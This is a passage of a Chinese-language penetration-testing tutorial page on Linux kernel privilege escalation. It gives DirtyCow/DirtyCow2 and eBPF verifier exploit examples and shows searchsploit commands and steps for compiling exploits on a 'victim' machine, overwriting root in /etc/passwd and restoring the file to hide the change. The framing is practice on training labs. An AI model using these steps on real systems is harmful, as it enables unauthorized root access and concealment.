<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">searchsploit dipper</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240604155353832-94370069-258469e90edfa0656619f71d445b01e9.png" width="1024" height="139" class="img_ev3q"></p>
<blockquote>
<p>为此，我会选择第二个，因为它似乎是原始漏洞利用的更新版本。您会经常在 searchsploit 中看到这一点，即发布了漏洞利用的更新版本，您可以选择使用较新的版本或原始版本。</p>
</blockquote>
<p>获取较新版本的副本，然后再次使用<strong>head</strong>命令检查注释。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240604155353258-44322398-cd7e37107ae9a64db60f3feb78d2fd2e.png" width="572" height="295" class="img_ev3q"></p>
<p>上面我们可以看到没有有关编译的说明，因此我们可以假设它可以使用基本语法。</p>
<p>现在我们可以将其传输到我们的受害者机器，编译它，然后获取我们的 root shell。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240604155353997-1344280871-f5ab75f36b869b9ccae93500088953a8.png" width="536" height="667" class="img_ev3q"></p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="43dirtycowdirtycow2-示例"><strong><div id="id4.3">4.3、DirtyCow/DirtyCow2 示例</div></strong><a href="#43dirtycowdirtycow2-示例" class="hash-link" aria-label="43dirtycowdirtycow2-示例的直接链接" title="43dirtycowdirtycow2-示例的直接链接">​</a></h4>
<p>CVE：2016-5195 – DirtyCow</p>
<ul>
<li><code>Kernels：2.6.22 &lt;= 3.9（and some 4.x）</code>【请注意，在该范围之间有相当多的修补版本，要查找已修补的内容，请查看此处的<a href="https://github.com/dirtycow/dirtycow.github.io/wiki/Patched-Kernel-Versions" target="_blank" rel="noopener noreferrer">链接</a>。】</li>
</ul>
<p>使用searchsploit查找漏洞，如下所示：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">searchsploit dirty cow</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240604155353578-76346613-63f7fe9d4d224f1014d24939b97e0709.png" width="1021" height="219" class="img_ev3q"></p>
<p>如您所见，这里有两种方法。最上面的一个方法被称为“pokemon”方法--也被称为“DitryCow2”；另一个是竞争条件，就是标准的 DirtyCow。</p>
<blockquote>
<p>我个人喜欢使用 DitryCow2，因为与原版相比，我用它取得了更多的成功。</p>
</blockquote>
<p>获取 DirtyCow2 的副本，然后再次使用<strong>head</strong>命令检查注释。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240604155354173-1709399117-e91b8d48b98e3e043e1803de0c724f79.png" width="601" height="447" class="img_ev3q"></p>
<p>这里我们可以看到一些特殊的编译指令，这就是为什么我们总是检查注释。如果我们尝试使用<strong>gcc</strong>进行基本语法来编译它，它将无法工作。我们还可以看到如何执行它，所以让我们测试一下吧！</p>
<p>就像我们迄今为止看到的其他漏洞一样，我们现在可以将其传输到受害者计算机上，编译它，然后获取我们的 root shell。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240604155353756-797505050-f209b49ed44ae0d046b02bf3bd6d6ea0.png" width="613" height="669" class="img_ev3q"></p>
<p>编译并执行漏洞利用程序后，系统会提示我们输入密码；按 Enter 键，我们将其设置为空白。现在我们必须检查/etc/passwd文件以确认我们已经覆盖了 root 用户。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cat /etc/passwd</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240604155354335-1562940421-d8e74d394322824a37217bea2f239ee1.png" width="681" height="560" class="img_ev3q"></p>
<p>Amazing！它起作用了，我们用“Firefart”替换了 root 用户。现在，正如评论所说，我们可以使用<strong>su</strong>以 firefart 或<strong>ssh</strong>身份登录。为了让我们更轻松，让我们使用命令<strong>su firefart</strong>，然后在提示输入密码时按 Enter。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240604155353443-1454110501-563f2bd9b8aefa326ff321eccbe1bf8f.png" width="366" height="119" class="img_ev3q"></p>
<p>Amazing！我们获得了 root 权限！现在我们可以简单地使用创建的备份恢复 passwd 文件，并假装这件事从未发生过 ，同时保持登录 firefart 即 root 权限！</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240604155354137-1946332600-c619e50a8c0fe96f40ae88558eedd630.png" width="602" height="256" class="img_ev3q"></p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="44ebpf-verifier示例"><strong><div id="id4.4">4.4、eBPF Verifier示例</div></strong><a href="#44ebpf-verifier示例" class="hash-link" aria-label="44ebpf-verifier示例的直接链接" title="44ebpf-verifier示例的直接链接">​</a></h4>
<p>CVE：2017-16995 – eBPF_Verifier</p>
<ul>
<li>Kernels：4.4.0-x &lt; 4.13.x（也可能包括较旧的内核）</li>
</ul>
<p>使用searchsploit查找漏洞，如下所示：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">searchsploit 4.13.9</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240604155353466-345141614-4ae8a8a519d707ffe8a1ddc3f1314b42.png" width="1019" height="126" class="img_ev3q"></p>
<p>获取 45010.c (eBPF_verifier) 的副本，然后使用<strong>head</strong>命令检查注释。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240604155354379-445349729-dc9402b8db5d99bc8560396086538f50.png" width="1014" height="719" class="img_ev3q"></p>
<p>这里的注释表明该漏洞利用程序只是使用基本的<strong>gcc</strong>语法进行编译的。此外，我们还可以看到漏洞成功执行时的样子。</p>
<p>现在我们可以将其传输到我们的受害者机器，编译它，然后获取我们的 root shell。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240604155354139-1900055221-8573b46c11bcd4ea92780ced2f56a357.png" width="731" height="400" class="img_ev3q"></p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="5最后的想法"><strong><div id="id5">5、最后的想法</div></strong><a href="#5最后的想法" class="hash-link" aria-label="5最后的想法的直接链接" title="5最后的想法的直接链接">​</a></h2>
<p>内容太多了！但是，我们只介绍了新旧内核版本中的大部分最佳内核漏洞。还有很多不错的漏洞，但这足以让您很好地了解内核漏洞的工作原理以及要寻找哪些漏洞。</p>
<p>内核漏洞利用有几个注意事项：</p>
<ul>
<li>在 HackTheBox、TryHackMe、PG Practice、PWK labs 等平台上进行黑客攻击时，不要在看到内核漏洞利用程序时直接使用它。我建议你枚举一下它，并将其放在您的后口袋中，因为十之八九的内核利用不是预期的方法。花点时间尝试找到预期的路线，如果最终实在找不到任何东西，那么就寻找内核漏洞。</li>
<li>如果一开始没有成功，那就再试一次。如果内核漏洞在第一次弹出时不起作用，请再试几次。恢复机器并重试。相信我，这可以为你节省几个小时，因为你只有 24 小时的时间来破解多个机器。</li>
</ul></div></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="文件选项卡"><a class="pagination-nav__link pagination-nav__link--prev" href="/web/docs/渗透/Linux 提权/Linux 提权-Sudo_2"><div class="pagination-nav__sublabel">上一页</div><div class="pagination-nav__label">Linux 提权-Sudo_2</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/web/docs/渗透/Linux 提权/Linux 提权-密码搜寻"><div class="pagination-nav__sublabel">下一页</div><div class="pagination-nav__label">Linux 提权-密码搜寻</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#导航" class="table-of-contents__link toc-highlight">导航</a></li><li><a href="#0前言" class="table-of-contents__link toc-highlight"><strong><div>0、前言</div></strong></a></li><li><a href="#1内核简介" class="table-of-contents__link toc-highlight"><strong><div>1、内核简介</div></strong></a></li><li><a href="#2寻找内核漏洞" class="table-of-contents__link toc-highlight"><strong><div>2、寻找内核漏洞</div></strong></a></li><li><a href="#3编译执行内核漏洞" class="table-of-contents__link toc-highlight"><strong><div>3、编译/执行内核漏洞</div></strong></a></li><li><a href="#4多种内核漏洞利用示例" class="table-of-contents__link toc-highlight"><strong><div>4、多种内核漏洞利用示例</div></strong></a></li><li><a href="#5最后的想法" class="table-of-contents__link toc-highlight"><strong><div>5、最后的想法</div></strong></a></li></ul></div></div></div></div></main></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="margin-bottom--sm"><a href="https://www.cnblogs.com/kqdssheng" rel="noopener noreferrer" class="footerLogoLink_BH7S"><img src="/web/img/logo.svg" alt="博客园" class="footer__logo themedComponent_mlkZ themedComponent--light_NVdE" width="30" height="30"><img src="/web/img/logo.svg" alt="博客园" class="footer__logo themedComponent_mlkZ themedComponent--dark_xIcU" width="30" height="30"></a></div></div></div></footer></div>
</body>
</html>